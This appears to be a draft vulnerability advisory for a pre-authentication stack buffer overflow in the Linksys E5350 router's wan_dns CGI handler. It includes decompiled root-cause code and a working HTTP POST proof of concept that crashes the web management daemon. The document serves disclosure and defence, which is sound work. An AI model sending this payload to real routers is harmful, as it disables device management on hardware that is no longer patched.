# CVE-TBD: Linksys E5350 Stack-Based Buffer Overflow in wan_dns CGI Parameter Handling (Crash Verified, Pre-Auth in Factory State)

## Affected Product

- Vendor: Linksys
- Product: E5350
- Firmware: v1.0.00.037 (latest and last release; the product is end-of-life)
- Component: `httpd` (CyberTAN-derived embedded web server), `wan_dns`
  variables[] handler `FUN_00434ab8`

## Summary

A stack-based buffer overflow was discovered in Linksys E5350 firmware
v1.0.00.037. The handler for the `wan_dns` CGI parameter family
concatenates the four user-supplied octet parameters `wan_dns0_0` …
`wan_dns0_3` into a **20-byte stack buffer** using unbounded `strcat()`
calls, appending the "." separators manually. Input validation
(`valid_ipaddr()`) runs only **after** the copy, so it cannot prevent the
overflow. The overflow was **dynamically verified to crash the web
management daemon** (4/4 runs with a 200-byte input; saved return address
overwritten in the 129–200 byte window). Two reachability paths exist:

1. **Post-authentication** — any logged-in administrator session via
   `/apply.cgi`.
2. **Pre-authentication (factory/wizard state)** — while the device is in
   its out-of-box / post-factory-reset setup state (`wizard_finish != 1`),
   `/wizard/apply.cgi` is served with no session check and dispatches into
   the *same* shared handler (see companion filing
   01-wizard-preauth-command-injection), so an unauthenticated LAN-adjacent
   attacker can trigger the overflow during the setup window.

## Vulnerability Type / CWE

- CWE-121: Stack-based Buffer Overflow
- The pre-auth wizard path additionally implies CWE-306 (Missing
  Authentication for Critical Function) — see companion filing 01.

## Root Cause

variables[] dispatch table entry 26 @ 0x497938: `name="wan_dns"`,
`handler=0x00434ab8`.

```c
FUN_00434ab8:
    char acStack_c8[20];
    ...
    snprintf(tmp, 0x1e, "%s%d_%d", "wan_dns", i, j);   // wan_dns0_0 ... wan_dns0_3
    val = get_cgi(tmp);
    if (val == NULL) return;
    strcat(acStack_c8, val);          // UNBOUNDED — once per octet, four times
    acStack_c8[len] = '.';            // separator appended manually
    ...
    valid_ipaddr(acStack_c8);         // validation happens AFTER the overflow
```

The dispatcher (`FUN_0043aa90`, shared by `/apply.cgi` and
`/wizard/apply.cgi`) iterates all 280 variables[] entries on
`gui_action=Apply`; the `wan_dns` handler runs whenever a parameter
literally named `wan_dns` is present (any value).

## Proof of Concept (non-destructive)

```
POST /wizard/apply.cgi HTTP/1.1        # pre-auth, device in factory state
Host: <ROUTER_IP>
Content-Type: application/x-www-form-urlencoded

submit_button=index&gui_action=Apply&wan_dns=1&wan_dns0_0=AAAA...(200 bytes)...&wan_dns0_1=1&wan_dns0_2=1&wan_dns0_3=1
```

Observed on rehosted firmware (QEMU user-mode, full NVRAM emulation):

Pre-auth path (factory state; no session, no credentials):

- 200-byte `wan_dns0_0`: `HTTP 200`, then the httpd process is **gone** —
  subsequent requests refused (HTTP 000). Reproduced **4/4** runs across
  separate httpd restarts.
- 8-byte control: `HTTP 200`, service stays alive.

Post-auth path (`/apply.cgi` with a session) crashes identically.

Crash-threshold gradient (fresh httpd each run): inputs of 8–128 bytes
never crash; 200 bytes crashes every time — the saved `$ra` is overwritten
somewhere in the 129–200 byte window above the 20-byte buffer (adjacent
stack-variable padding absorbs shorter inputs).

## Impact

- **Demonstrated:** unauthenticated (factory state) or authenticated
  attacker can reliably crash the web management daemon — denial of service
  of the management plane until the device recovers/reboots.
- The overflow is a classic saved-`$ra` stack overwrite on MIPS with
  attacker-controlled bytes; control of PC is textbook-feasible on real
  hardware. **No RCE chain was developed** (non-destructive PoC policy) —
  code execution is claimed as potential only, and the score below reflects
  only the demonstrated impact.

## Non-duplication

The "four-octet concatenation overflow" defect family is known in other
CyberTAN-based Linksys models: CVE-2025-60690 / CVE-2025-60693 (E1200 v2,
functions `get_merge_ipaddr` / `get_merge_mac`). Those functions **do not
exist** in E5350 firmware (string/xref scan); the vulnerable instance here
is a distinct function (`wan_dns` handler at 0x00434ab8; statically
confirmed siblings exist in the static-route and DHCP-reservation handlers
but were not dynamically reproduced and are not part of this filing). No
existing CVE covers Linksys E5350 for any issue except CVE-2022-35572
(information disclosure, unrelated).

## Proposed CVSS 3.1

`AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` — **6.5 (Medium)**

(scored on the demonstrated pre-auth daemon crash only; the potential but
undemonstrated code execution is intentionally not reflected)

## Discovery

- Date: 2026-10-11
- Method: static reverse engineering (Ghidra) + dynamic crash reproduction
  on rehosted firmware (QEMU user-mode), including a crash-threshold
  gradient and pre-auth/post-auth path comparison
- Researcher: Zimo-666

## Timeline

- 2026-10-11: Vulnerability discovered and verified
- TBD: Vendor notification
- TBD: CVE ID assignment
- TBD: Public disclosure
